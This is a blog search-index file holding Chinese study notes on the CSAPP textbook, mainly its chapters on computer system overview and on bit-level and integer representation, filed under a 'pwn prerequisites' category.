<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>CSAPP-1-计算机系统漫谈</title>
    <link href="/2023/09/04/CSAPP/CSAPP-1-%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E6%BC%AB%E8%B0%88/"/>
    <url>/2023/09/04/CSAPP/CSAPP-1-%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E6%BC%AB%E8%B0%88/</url>
    
    <content type="html"><![CDATA[<h1 id="CSAPP第一章总览"><a href="#CSAPP第一章总览" class="headerlink" title="CSAPP第一章总览"></a>CSAPP第一章总览</h1><h2 id="1-1信息就是位-上下文"><a href="#1-1信息就是位-上下文" class="headerlink" title="1.1信息就是位+上下文"></a>1.1信息就是位+上下文</h2><ul><li><p>源程序实际上就是一个由0和1组成的位(又称为比特)序列，8个位被组织成一组，称为字节。</p></li><li><p>使用ASCII标准来表示文本字符，这种方式实际上就是用一个唯一的单字节大小的整数值。来表示每个字</p></li><li><p>只由ASCII字符构成的文件称为文本文件，所有其他文件都称为二进制文件。</p></li><li><p>系统中所有的信息——包括磁盘文件、内存中的程序、内存中存放的用户数据以及网络上传送的数据，都是由一串比特表示的。区分不同数据对象的唯一方法是我们读到这些数据对象时的上下文。比如，在不同的上下文中，一个同样的字节序列可能表示一个整数、浮点数、宇符串或者机器指令。</p></li></ul><h2 id="1-2程序被翻译成不同格式"><a href="#1-2程序被翻译成不同格式" class="headerlink" title="1.2程序被翻译成不同格式"></a>1.2程序被翻译成不同格式</h2><ul><li><p>C语句都必须被其他程序转化为一系列的低级机器语言指令。然后这些指令按照一种称为可执行目标程序的格式打好包，并以二进制磁盘文件的形式存放起来。目标程序也称为可执行目标文件。</p><p>  <img src="/../../images/CSAPP-1-%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E6%BC%AB%E8%B0%88/image-20230829194201348.png"></p><p>  <img src="/../../images/CSAPP-1-%25E8%25AE%25A1%25E7%25AE%2597%25E6%259C%25BA%25E7%25B3%25BB%25E7%25BB%259F%25E6%25BC%25AB%25E8%25B0%2588/image-20230829194201348.png" alt="image-20230829194201348"></p></li></ul><h2 id="1-3编译系统"><a href="#1-3编译系统" class="headerlink" title="1.3编译系统"></a>1.3编译系统</h2><ul><li><p>优化程序性能</p><blockquote><p>需要了解机器代码以及编译器将C语句转化为代码的方式</p></blockquote></li><li><p>理解链接时出现的错误</p><blockquote><p>最令人困扰的程序往往都与链接器操作有关，有些错误直到运行才会出现</p></blockquote></li><li><p>避免安全漏洞，降低攻击威胁</p><blockquote><p>缓冲区溢出错误为主要原因</p><p>需要限制数据接收的数量和格式理解数据和控制信息存储在程序栈上的方式</p></blockquote></li></ul><h2 id="1-4处理器读取并解释指令"><a href="#1-4处理器读取并解释指令" class="headerlink" title="1.4处理器读取并解释指令"></a>1.4处理器读取并解释指令</h2><p>例：</p><p><img src="/../../../../%25E7%2584%25A6%25E6%2596%2587%25E9%2594%25A6/hexo-blog/source/images/CSAPP-1-%25E8%25AE%25A1%25E7%25AE%2597%25E6%259C%25BA%25E7%25B3%25BB%25E7%25BB%259F%25E6%25BC%25AB%25E8%25B0%2588/image-20230829215158994.png" alt="image-20230829215158994"></p><h3 id="1-4-1硬件组成"><a href="#1-4-1硬件组成" class="headerlink" title="1.4.1硬件组成"></a>1.4.1硬件组成</h3><ul><li><p>总线</p></li><li><p>I&#x2F;O设备</p><blockquote><p>作为用户输入的键盘和鼠标，作为用户输出的显示器，以及用于长期存储数据和程序的磁盘驱动器(简单地说就是磁盘</p><p>每个I&#x2F;O设备都通过一个控制器或适配器与I&#x2F;O总线相连</p></blockquote></li><li><p>主存</p><blockquote><p>主存是一个临时存储设备，在处理器执行程序时，用来存放程序和程序处理的数据。从物理上来说，主存是由一组动态随机存取存储器(DRAM)芯片组成的。从逻辑上来说，存储器是一个线性的字节数组，每个字节都有其唯一的地址(数组索引),&#x3D;&#x3D;地址从零开始。&#x3D;&#x3D;</p></blockquote></li><li><p>处理器</p><blockquote><p>中央处理单元(CPU),简称处理器，是解释(或执行)存储在主存中指令的引擎。处理器的核心是一个大小为一个字的存储设备(或寄存器),称为程序计数器(PC)。在任何时刻,PC都指向主存中的某条机器语言指令(即含有该条指令的地址)。(~AX)</p><p>&#x3D;&#x3D;处理器从程序计数器指向的内存处读取指令，解释指令中的位，执行该指令指示的简单操作，然后更新PC,使其指向下一条指令，而这条指令并不一定和在内存中刚刚执行的指令相邻。&#x3D;&#x3D;</p><p><strong>寄存器</strong></p><p>寄存器文件是一个小的存储设备，由一些单个字长的寄存器组成，每个寄存器都有唯一的名字。</p><ul><li>加载：从主存复制一个字节或者一个字到寄存器，以覆盖寄存器原来的内容。</li><li>存储：从寄存器复制一个字节或者一个字到主存的某个位置，以覆盖这个位置上原来的内容。</li><li>操作：把两个寄存器的内容复制到ALU,ALU对这两个字做算术运算，并将结果存放到一个寄存器中，以覆盖该寄存器中原来的内容。</li><li>跳转：从指令本身中抽取一个字，并将这个字复制到程序计数器(PC)中，以覆盖PC中原来的值。</li></ul><p>现代处理器使用了非常复杂的机制来加速程序的执行。因此，我们将处理器的指令集架构和处理器的微体系结构区分开来：</p><p>指令集架构描述的是每条机器代码指令的效果；而微体系结构描述的是处理器实际上是如何实现的。</p></blockquote></li></ul><h3 id="1-4-2具体例子"><a href="#1-4-2具体例子" class="headerlink" title="1.4.2具体例子"></a>1.4.2具体例子</h3><p><img src="/../../../../%25E7%2584%25A6%25E6%2596%2587%25E9%2594%25A6/hexo-blog/source/images/CSAPP-1-%25E8%25AE%25A1%25E7%25AE%2597%25E6%259C%25BA%25E7%25B3%25BB%25E7%25BB%259F%25E6%25BC%25AB%25E8%25B0%2588/image-20230829215548777.png" alt="image-20230829215548777"></p><p><img src="/../../../../%25E7%2584%25A6%25E6%2596%2587%25E9%2594%25A6/hexo-blog/source/images/CSAPP-1-%25E8%25AE%25A1%25E7%25AE%2597%25E6%259C%25BA%25E7%25B3%25BB%25E7%25BB%259F%25E6%25BC%25AB%25E8%25B0%2588/image-20230829215631442.png" alt="image-20230829215631442"></p><h2 id="1-5高速缓存"><a href="#1-5高速缓存" class="headerlink" title="1.5高速缓存"></a>1.5高速缓存</h2><p><img src="/../../../../%25E7%2584%25A6%25E6%2596%2587%25E9%2594%25A6/hexo-blog/source/images/CSAPP-1-%25E8%25AE%25A1%25E7%25AE%2597%25E6%259C%25BA%25E7%25B3%25BB%25E7%25BB%259F%25E6%25BC%25AB%25E8%25B0%2588/image-20230829232725582.png" alt="image-20230829232725582"></p><p>高速缓存存储器(cache memory,简称为cache或高速缓存),作为暂时的集结区域，存放处理器近期可能会需要的信息。</p><p><img src="/../../../../%25E7%2584%25A6%25E6%2596%2587%25E9%2594%25A6/hexo-blog/source/images/CSAPP-1-%25E8%25AE%25A1%25E7%25AE%2597%25E6%259C%25BA%25E7%25B3%25BB%25E7%25BB%259F%25E6%25BC%25AB%25E8%25B0%2588/image-20230829233400313.png" alt="image-20230829233400313"></p><p>Ll和L2高速缓存是用一种叫做静态随机访问存储器(SRAM)的硬件技术实现的。</p><p>利用高速缓存的局部性原理，即程序具有访问局部区域里的数据和代码的趋势。通过让高速缓存里存放可能经常访问的数据，大部分的内存操作都能在快速的高速缓存中完成。</p><h2 id="1-6存储设备层次结构"><a href="#1-6存储设备层次结构" class="headerlink" title="1.6存储设备层次结构"></a>1.6存储设备层次结构</h2><p><img src="/../../../../%25E7%2584%25A6%25E6%2596%2587%25E9%2594%25A6/hexo-blog/source/images/CSAPP-1-%25E8%25AE%25A1%25E7%25AE%2597%25E6%259C%25BA%25E7%25B3%25BB%25E7%25BB%259F%25E6%25BC%25AB%25E8%25B0%2588/image-20230829233657784.png" alt="image-20230829233657784"></p><p><strong>存储器层次结构主要思想是上一层的存储器作为低一层存储器的高速缓存。</strong></p><p>寄存器文件是L1的高速缓存，L1是L2的高速缓存……最后的是主存的高速缓存，主存是磁盘的高速缓存……</p><h2 id="1-7操作系统"><a href="#1-7操作系统" class="headerlink" title="1.7操作系统"></a>1.7操作系统</h2><p>我们可以把操作系统看成是应用程序和硬件之间插入的一层软件，所有应用程序对硬件的操作尝试都必须通过操作系统。</p><p><img src="/../../../../%25E7%2584%25A6%25E6%2596%2587%25E9%2594%25A6/hexo-blog/source/images/CSAPP-1-%25E8%25AE%25A1%25E7%25AE%2597%25E6%259C%25BA%25E7%25B3%25BB%25E7%25BB%259F%25E6%25BC%25AB%25E8%25B0%2588/image-20230829234449429.png" alt="image-20230829234449429"></p><p>操作系统有两个基本功能：</p><p>(1)防止硬件被失控的应用程序滥用；</p><p>(2)向应用程序提供简单一致的机制来控制复杂而又通常大不相同的低级硬件设备。</p><p>操作系统通过几个基本的抽象概念(进程、虚拟内存和文件)来实现这两个功能。</p><p>文件是对I&#x2F;O设备的抽象表示，虚拟内存是对主存和磁盘I&#x2F;O设备的抽象表示，进程则是对处理器、主存和I&#x2F;O设备的抽象表示。</p><blockquote><p>标准Unix规范”的独立标准化工作已经与Posix一起创建了统一的Unix系统标准。这些标准化工作的结果是Unix版本之间的差异已经基本消失。</p></blockquote><h3 id="1-7-1进程"><a href="#1-7-1进程" class="headerlink" title="1.7.1进程"></a>1.7.1进程</h3><blockquote><p>​像hello这样的程序在现代系统上运行时，操作系统会提供一种假象，就好像系统上只有这个程序在运行。程序看上去是独占地使用处理器、主存和I&#x2F;O设备。处理器看上去就像在不间断地一条接一条地执行程序中的指令，即该程序的代码和数据是系统内存中唯一的对象。这些假象是通过进程的概念来实现的，进程是计算机科学中最重要和最成功的概念之一。</p></blockquote><p>进程是操作系统对一个正在运行的程序的一种抽象。在一个系统上可以同时运行多个进程，而每个进程都好像在独占地使用硬件。</p><p>并发运行，则是说一个进程的指令和另一个进程的指令是交错执行的。</p><p>在大多数系统中，需要运行的进程数是多于可以运行它们的CPU个数的。传统系统在一个时刻只能执行一个程序，而先进的多核处理器同时能够执行多个程序。无论是在单核还是多核系统中，一个CPU看上去都像是在并发地执行多个进程，这是通过处理器在进程间切换来实现的。</p><p>操作系统实现这种交错执行的机制称为&#x3D;&#x3D;上下文切换。&#x3D;&#x3D;</p><p><img src="/../../../../%25E7%2584%25A6%25E6%2596%2587%25E9%2594%25A6/hexo-blog/source/images/CSAPP-1-%25E8%25AE%25A1%25E7%25AE%2597%25E6%259C%25BA%25E7%25B3%25BB%25E7%25BB%259F%25E6%25BC%25AB%25E8%25B0%2588/image-20230830005204092.png" alt="image-20230830005204092"></p><h3 id="1-7-2线程"><a href="#1-7-2线程" class="headerlink" title="1.7.2线程"></a>1.7.2线程</h3><p><img src="/../../../../%25E7%2584%25A6%25E6%2596%2587%25E9%2594%25A6/hexo-blog/source/images/CSAPP-1-%25E8%25AE%25A1%25E7%25AE%2597%25E6%259C%25BA%25E7%25B3%25BB%25E7%25BB%259F%25E6%25BC%25AB%25E8%25B0%2588/image-20230830005341962.png" alt="image-20230830005341962"></p><h3 id="1-7-3虚拟内存"><a href="#1-7-3虚拟内存" class="headerlink" title="1.7.3虚拟内存"></a>1.7.3虚拟内存</h3><p>虚拟内存是一个抽象概念，它为每个进程提供了一个假象，即每个进程都在独占地使用主存。每个进程看到的内存都是一致的，称为虚拟地址空间。</p><p><img src="/../../../../%25E7%2584%25A6%25E6%2596%2587%25E9%2594%25A6/hexo-blog/source/images/CSAPP-1-%25E8%25AE%25A1%25E7%25AE%2597%25E6%259C%25BA%25E7%25B3%25BB%25E7%25BB%259F%25E6%25BC%25AB%25E8%25B0%2588/image-20230830005419762.png" alt="image-20230830005419762"></p><p><img src="/../../../../%25E7%2584%25A6%25E6%2596%2587%25E9%2594%25A6/hexo-blog/source/images/CSAPP-1-%25E8%25AE%25A1%25E7%25AE%2597%25E6%259C%25BA%25E7%25B3%25BB%25E7%25BB%259F%25E6%25BC%25AB%25E8%25B0%2588/image-20230830005450662.png" alt="image-20230830005450662"></p><h3 id="1-7-4文件"><a href="#1-7-4文件" class="headerlink" title="1.7.4文件"></a>1.7.4文件</h3><p>文件就是字节序列。所有计算机系统中的交互设备都可以看作文件。</p><p>这个概念向应用程序提供了一个统一的视图来看待系统中各种I&#x2F;O设备。</p><h2 id="1-8网络"><a href="#1-8网络" class="headerlink" title="1.8网络"></a>1.8网络</h2><p><img src="/../../../../%25E7%2584%25A6%25E6%2596%2587%25E9%2594%25A6/hexo-blog/source/images/CSAPP-1-%25E8%25AE%25A1%25E7%25AE%2597%25E6%259C%25BA%25E7%25B3%25BB%25E7%25BB%259F%25E6%25BC%25AB%25E8%25B0%2588/image-20230830005939786.png" alt="image-20230830005939786"></p><p><img src="/../../../../%25E7%2584%25A6%25E6%2596%2587%25E9%2594%25A6/hexo-blog/source/images/CSAPP-1-%25E8%25AE%25A1%25E7%25AE%2597%25E6%259C%25BA%25E7%25B3%25BB%25E7%25BB%259F%25E6%25BC%25AB%25E8%25B0%2588/image-20230830010001125.png" alt="image-20230830010001125"></p><h2 id="1-9小结"><a href="#1-9小结" class="headerlink" title="1.9小结"></a>1.9小结</h2><p><strong>系统不仅仅只是硬件，系统是软硬件互相交织的集合体，它们共同协作来运行应用程序。</strong></p><p>Amdahl定律：短板效应</p><p><img src="/../../../../%25E7%2584%25A6%25E6%2596%2587%25E9%2594%25A6/hexo-blog/source/images/CSAPP-1-%25E8%25AE%25A1%25E7%25AE%2597%25E6%259C%25BA%25E7%25B3%25BB%25E7%25BB%259F%25E6%25BC%25AB%25E8%25B0%2588/image-20230830010146213.png" alt="image-20230830010146213"></p><h1 id="课后习题要点"><a href="#课后习题要点" class="headerlink" title="课后习题要点"></a>课后习题要点</h1><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>以上是对现代计算机系统的综述和总结，以及对本书主要内容的梳理。</p><p>下面是复习时主要关注的内容：</p>]]></content>
    
    
    <categories>
      
      <category>PWN</category>
      
      <category>pwn前置知识</category>
      
      <category>CSAPP</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CSAPP</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CSAPP(6)-存储器层次结构</title>
    <link href="/2023/08/29/CSAPP/CSAPP-6-%E5%AD%98%E5%82%A8%E5%99%A8%E5%B1%82%E6%AC%A1%E7%BB%93%E6%9E%84/"/>
    <url>/2023/08/29/CSAPP/CSAPP-6-%E5%AD%98%E5%82%A8%E5%99%A8%E5%B1%82%E6%AC%A1%E7%BB%93%E6%9E%84/</url>
    
    <content type="html"><![CDATA[<h1 id="CSAPP第六章总览"><a href="#CSAPP第六章总览" class="headerlink" title="CSAPP第六章总览"></a>CSAPP第六章总览</h1><h1 id="视频学习与思考"><a href="#视频学习与思考" class="headerlink" title="视频学习与思考"></a>视频学习与思考</h1><h1 id="课后习题要点"><a href="#课后习题要点" class="headerlink" title="课后习题要点"></a>课后习题要点</h1><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1>]]></content>
    
    
    <categories>
      
      <category>PWN</category>
      
      <category>pwn前置知识</category>
      
      <category>CSAPP</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CSAPP</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CSAPP(5)-程序性能优化</title>
    <link href="/2023/08/29/CSAPP/CSAPP-5-%E7%A8%8B%E5%BA%8F%E6%80%A7%E8%83%BD%E4%BC%98%E5%8C%96/"/>
    <url>/2023/08/29/CSAPP/CSAPP-5-%E7%A8%8B%E5%BA%8F%E6%80%A7%E8%83%BD%E4%BC%98%E5%8C%96/</url>
    
    <content type="html"><![CDATA[<h1 id="CSAPP第五章总览"><a href="#CSAPP第五章总览" class="headerlink" title="CSAPP第五章总览"></a>CSAPP第五章总览</h1><h1 id="视频学习与思考"><a href="#视频学习与思考" class="headerlink" title="视频学习与思考"></a>视频学习与思考</h1><h1 id="课后习题要点"><a href="#课后习题要点" class="headerlink" title="课后习题要点"></a>课后习题要点</h1><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1>]]></content>
    
    
    <categories>
      
      <category>PWN</category>
      
      <category>pwn前置知识</category>
      
      <category>CSAPP</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CSAPP</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CSAPP(4)-处理器体系结构</title>
    <link href="/2023/08/29/CSAPP/CSAPP-4-%E5%A4%84%E7%90%86%E5%99%A8%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84/"/>
    <url>/2023/08/29/CSAPP/CSAPP-4-%E5%A4%84%E7%90%86%E5%99%A8%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84/</url>
    
    <content type="html"><![CDATA[<h1 id="CSAPP第四章总览"><a href="#CSAPP第四章总览" class="headerlink" title="CSAPP第四章总览"></a>CSAPP第四章总览</h1><h1 id="视频学习与思考"><a href="#视频学习与思考" class="headerlink" title="视频学习与思考"></a>视频学习与思考</h1><h1 id="课后习题要点"><a href="#课后习题要点" class="headerlink" title="课后习题要点"></a>课后习题要点</h1><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1>]]></content>
    
    
    <categories>
      
      <category>PWN</category>
      
      <category>pwn前置知识</category>
      
      <category>CSAPP</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CSAPP</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CSAPP(3)-程序的机器级表示</title>
    <link href="/2023/08/29/CSAPP/CSAPP-3-%E7%A8%8B%E5%BA%8F%E7%9A%84%E6%9C%BA%E5%99%A8%E7%BA%A7%E8%A1%A8%E7%A4%BA/"/>
    <url>/2023/08/29/CSAPP/CSAPP-3-%E7%A8%8B%E5%BA%8F%E7%9A%84%E6%9C%BA%E5%99%A8%E7%BA%A7%E8%A1%A8%E7%A4%BA/</url>
    
    <content type="html"><![CDATA[<h1 id="CSAPP第三章总览"><a href="#CSAPP第三章总览" class="headerlink" title="CSAPP第三章总览"></a>CSAPP第三章总览</h1><h1 id="视频学习与思考"><a href="#视频学习与思考" class="headerlink" title="视频学习与思考"></a>视频学习与思考</h1><h1 id="课后习题要点"><a href="#课后习题要点" class="headerlink" title="课后习题要点"></a>课后习题要点</h1><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1>]]></content>
    
    
    <categories>
      
      <category>PWN</category>
      
      <category>pwn前置知识</category>
      
      <category>CSAPP</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CSAPP</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CSAPP(2)-信息的表示与处理</title>
    <link href="/2023/08/29/CSAPP/CSAPP-2-%E4%BF%A1%E6%81%AF%E7%9A%84%E8%A1%A8%E7%A4%BA%E4%B8%8E%E5%A4%84%E7%90%86/"/>
    <url>/2023/08/29/CSAPP/CSAPP-2-%E4%BF%A1%E6%81%AF%E7%9A%84%E8%A1%A8%E7%A4%BA%E4%B8%8E%E5%A4%84%E7%90%86/</url>
    
    <content type="html"><![CDATA[<h1 id="CSAPP第二章总览"><a href="#CSAPP第二章总览" class="headerlink" title="CSAPP第二章总览"></a>CSAPP第二章总览</h1><h1 id="视频学习与思考"><a href="#视频学习与思考" class="headerlink" title="视频学习与思考"></a>视频学习与思考</h1><h2 id="数字的位级表示"><a href="#数字的位级表示" class="headerlink" title="数字的位级表示"></a>数字的位级表示</h2><p>​——everything is bits</p><p>&#x3D;&#x3D;用有限的位组合形式表示在数域中无限扩张的数&#x3D;&#x3D;<br>bit is 0 or 1</p><p>4 bits可表示为十六进制</p><p>二进制清晰稳定，简单易存储</p><blockquote><p>1010</p><p>1011B</p><p>1100</p><p>1101D</p><p>1110</p><p>1111F</p></blockquote><p><img src="/../../images/CSAPP-2-%E4%BF%A1%E6%81%AF%E7%9A%84%E8%A1%A8%E7%A4%BA%E4%B8%8E%E5%A4%84%E7%90%86/image-20230814212956178.png" alt="image-20230814212956178"></p><h3 id="位级运算"><a href="#位级运算" class="headerlink" title="位级运算"></a>位级运算</h3><h4 id="关于布尔代数"><a href="#关于布尔代数" class="headerlink" title="关于布尔代数"></a>关于布尔代数</h4><p><img src="/../../images/CSAPP-2-%E4%BF%A1%E6%81%AF%E7%9A%84%E8%A1%A8%E7%A4%BA%E4%B8%8E%E5%A4%84%E7%90%86/image-20230827153125187.png" alt="image-20230827153125187"></p><h3 id="位操作："><a href="#位操作：" class="headerlink" title="位操作："></a>位操作：</h3><p><img src="/../../images/CSAPP-2-%E4%BF%A1%E6%81%AF%E7%9A%84%E8%A1%A8%E7%A4%BA%E4%B8%8E%E5%A4%84%E7%90%86/image-20230827214555101.png" alt="image-20230827214555101"></p><p>如上，当我们操作连续的bits时,可看作是对每个比特位进行布尔操作</p><p>你可以直接在C语言中执行这些低级别的位操作</p><p>*虚拟电子空间是由机器字长决定的</p><p><img src="/../../images/CSAPP-2-%E4%BF%A1%E6%81%AF%E7%9A%84%E8%A1%A8%E7%A4%BA%E4%B8%8E%E5%A4%84%E7%90%86/image-20230827222149352.png" alt="image-20230827222149352">上例是一种隐式的表示数值集合的方式：<br>对这些位进行从右向左编号，1的位置表示这个位置上所代表的数字在此集合中，0则表示不在</p><p>从上图中可以看出：</p><blockquote><p>&amp; 类似集合的交</p><p>| 类似集合的并</p><p>^ 类似集合的异或并</p><p>~ 类似集合的补集</p></blockquote><p>位表示集合</p><p>注意区分&amp;和&amp;&amp;，|和||，~和！，前者是位操作，后者是条件判断</p><p><img src="/../../images/CSAPP-2-%E4%BF%A1%E6%81%AF%E7%9A%84%E8%A1%A8%E7%A4%BA%E4%B8%8E%E5%A4%84%E7%90%86/image-20230828212258968.png" alt="image-20230828212258968"></p><p>最后一行可以测试空指针，如果是0或null，就能避免对空指针的访问</p><h3 id="位移"><a href="#位移" class="headerlink" title="位移"></a>位移</h3><h4 id="左移"><a href="#左移" class="headerlink" title="左移"></a>左移</h4><p>位整体向左移w位（前w位抹去，后补w个零）</p><h4 id="右移"><a href="#右移" class="headerlink" title="右移"></a>右移</h4><blockquote><p>逻辑右移</p></blockquote><p>位整体向右移w位（前w位补零，后w位抹去）</p><blockquote><p>算术右移</p></blockquote><p>位整体向右移w位（前w+1位若为1，前w位补1，否则补零；后w位抹去）</p><p>**PS:**实际上位移量是通过计算kmod </p><p>​w得到的。不过&#x3D;&#x3D;这种行为对于C程序来说是没有保证的&#x3D;&#x3D;，所以应该保持位移量小于待移位值的位数。另一方面，Java特别要求位移数量应该按照我们前面所讲的求模的方法来计算。</p><p>&#x3D;&#x3D;向左移动负数可能会导致结果逻辑右移&#x3D;&#x3D;</p><h2 id="整数表示"><a href="#整数表示" class="headerlink" title="整数表示"></a>整数表示</h2><h3 id="无符号数"><a href="#无符号数" class="headerlink" title="无符号数"></a>无符号数</h3><p><img src="/../../images/CSAPP-2-%E4%BF%A1%E6%81%AF%E7%9A%84%E8%A1%A8%E7%A4%BA%E4%B8%8E%E5%A4%84%E7%90%86/image-20230902173853207.png" alt="image-20230902173853207"></p><p>无符号数的二进制表示有一个很重要的属性，也就是每个介于0～2^n-1之间的数都有唯一一个n位的值编码。</p><p><img src="/../../images/CSAPP-2-%E4%BF%A1%E6%81%AF%E7%9A%84%E8%A1%A8%E7%A4%BA%E4%B8%8E%E5%A4%84%E7%90%86/image-20230902164616049.png" alt="image-20230902164616049"></p><h3 id="补码"><a href="#补码" class="headerlink" title="补码"></a>补码</h3><p><img src="/../../images/CSAPP-2-%E4%BF%A1%E6%81%AF%E7%9A%84%E8%A1%A8%E7%A4%BA%E4%B8%8E%E5%A4%84%E7%90%86/image-20230902192527599.png" alt="image-20230902192527599"></p><p><img src="/../../images/CSAPP-2-%E4%BF%A1%E6%81%AF%E7%9A%84%E8%A1%A8%E7%A4%BA%E4%B8%8E%E5%A4%84%E7%90%86/image-20230902193928478.png" alt="image-20230902193928478"></p><blockquote><p>补码范围不对称</p><p>C语言用补码表示有符号整数</p></blockquote><p><img src="/../../images/CSAPP-2-%E4%BF%A1%E6%81%AF%E7%9A%84%E8%A1%A8%E7%A4%BA%E4%B8%8E%E5%A4%84%E7%90%86/image-20230902194424919.png" alt="image-20230902194424919"></p><p>最高位有时称为符号位，在补码中，如果它为1，就是负数。</p><p>所有位为1的是-1</p><p><img src="/../../images/CSAPP-2-%E4%BF%A1%E6%81%AF%E7%9A%84%E8%A1%A8%E7%A4%BA%E4%B8%8E%E5%A4%84%E7%90%86/image-20230902195114055.png" alt="image-20230902195114055"></p><p>|TMax|&#x3D;|TMin|-1</p><p>因为-TMin&#x3D;TMax+1&#x3D;0x7FFF+1&#x3D;0x8000&#x3D;TMin</p><p>所以&#x3D;&#x3D;-TMin&#x3D;TMin&#x3D;&#x3D;</p><p>UMax&#x3D;2*TMax+1</p><p>&#x3D;&#x3D;int 会被转换为 unsigned！！！&#x3D;&#x3D;</p><p>i-sizeof(int)&gt;&#x3D;0 是无符号之间的比较</p><p><strong>补码的产生：</strong></p><p>计算机的<a href="https://so.csdn.net/so/search?q=ALU&spm=1001.2101.3001.7020">ALU</a>是由加法单元实现的，而加法只会产生进位，而不需要考虑借位。而我们现实中的减法运算则会产生借位操作。因此在实现减法的时候为了复用加法器，让加法器可以执行减法操作，就需要消除想办法消除减法的借位行为。</p><p>而最大的数在进行减法运算时刚好不需要借位，因此我们在进行减法运算的时候先加一个最大的数(我们假设为MAX)，再减去一个最大的数，然后根据结合率，我们先使用最大的数与减数进行计算，将结果与被减数相加，就可以消除减数与被减数之间的借位了，但是最后减去MAX的时候还是会产生借位。因此我们考虑MAX + 1，因为MAX进位后产生的是1个1，剩余的全是0，这样就可以把借位全部消除了。&#x3D;&#x3D;？&#x3D;&#x3D;<br>因此A - B 就转换为 A +（MAX - B）+ 1 - (MAX + 1)的形式。</p><p>MAX-B就叫做X的补码(X为该进制下的最大数字，比如二进制下X为1，十进制下X为9)，即如果是在十进制下计算A-B，则MAX-B的结果叫做B对9的补码，如果是二进制下计算，则MAX-B的结果叫做B对1的补码。</p><p>‘10’后面跟位数-1个0是MAX + 1的结果，所以&#x3D;&#x3D;MAX-B + 1叫做B对‘10’的补码&#x3D;&#x3D;，也就是我们在计算机课本中常见的补码的概念。</p><p>由于二进制的特殊性，二进制下MAX-B可以简单的转换为将B的各位取反，因此二进制下”补码”的计算，是将B的各位取反后加1。</p><p>由上面的分析我们可以知道B的”补码”可以当作-B来使用，只要在最后减去一个MAX+1即可，即在三位下最后减去‘1000’，四位下减去‘10000’。</p><p>但在上面需要注意，如果被减数小于减数，即产生一个为负的结果时， A +（MAX - B）+ 1 位数与原来相同，而 (MAX + 1)是多一位的，例如100-150， 100 +（999 - 150）+ 1结果是950，而 (999 + 1)是1000，此时虽然950与000的计算不需要借位，但是1000比950多了一个最高位，因此还是需要借位才能继续运算。</p><p>在这种情况下，我们再更换一下思路，使用减数减去被减数，得到结果再取负即可。即将A-B转换为B-A，再用上面的方式来消除借位。</p><p><strong>补码的应用：</strong></p><p>补码可以表示负数，因此8位二进制所表示的256种变化中有一半要用于去表示补码，即负数。而最高为1之后的数字刚好是128-256，因此这部分表示为补码的话刚好是127-1的补码，因此00000001-01111111的含义不变，表示1-127，而10000000-11111111的含义变为其所表示的补码的含义，即-128到-1(需要减100000000)，00000000表示0。</p><p><strong>最重要的是，由于计算机只能存储8位，所以<code>MAX + 1</code>超出8位限制，因此相当于减<code>00000000</code>，所以在计算机内可以直接补码视为负数，而不需要再去减<code>MAX+1</code>，因为此时MAX + 1相当于计算机中的0，虽然在现实中相当于10000。</strong>（溢出）</p><blockquote><p>C语言标准只指定了每种数据类型的最小范围，而不是确定的范围。虽然我们可以选择与大多数机器上的标准表示兼容的数据类型，但是这也不能保证可移植性。</p><p>使用宏能保证：不论代码是如何被编译的，都能生成正确的格式字符串。</p><p>Java标准是非常明确的。它要求采用补码表示，取值范围与图2-10中64位的情况一样。</p><p><img src="/../../images/CSAPP-2-%E4%BF%A1%E6%81%AF%E7%9A%84%E8%A1%A8%E7%A4%BA%E4%B8%8E%E5%A4%84%E7%90%86/image-20230902205959672.png" alt="image-20230902205959672">在Java中，单字节数据类型称为byte,而不是char。这些非常具体的要求都是为了保证无论在什么机器上运行，Java程序都能表现地完全一样。</p><p>C和C++有无符号都支持，Java只支持有符号数</p></blockquote><h3 id="有无符号数之间的转换"><a href="#有无符号数之间的转换" class="headerlink" title="有无符号数之间的转换"></a>有无符号数之间的转换</h3><p>C语言允许在各种不同的数字数据类型之间做强制类型转换。C是少数unsigned是明确的数据类型的语言之一</p><p>强制类型转换的结果保持位值不变，只是改变了解释这些位的方式。</p><p>-12345的16位补码表示与53191的16位无符号表示是完全一样的。将short强制类型转换为unsigned short改变数值，但是不改变位表示。</p><p>无符号形式的4294967295(UMax32)和补码形式的-1的位模式是完全一样的。将unsigned强制类型转换成int,底层的位表示保持不变。</p><p><img src="/../../images/CSAPP-2-%E4%BF%A1%E6%81%AF%E7%9A%84%E8%A1%A8%E7%A4%BA%E4%B8%8E%E5%A4%84%E7%90%86/image-20230903155143087.png" alt="image-20230903155143087"></p><p><strong>1+UMax&#x3D;2^w</strong></p><p><img src="/../../images/CSAPP-2-%E4%BF%A1%E6%81%AF%E7%9A%84%E8%A1%A8%E7%A4%BA%E4%B8%8E%E5%A4%84%E7%90%86/image-20230902211451667.png" alt="image-20230902211451667"></p><p><img src="/../../images/CSAPP-2-%E4%BF%A1%E6%81%AF%E7%9A%84%E8%A1%A8%E7%A4%BA%E4%B8%8E%E5%A4%84%E7%90%86/image-20230902211549246.png" 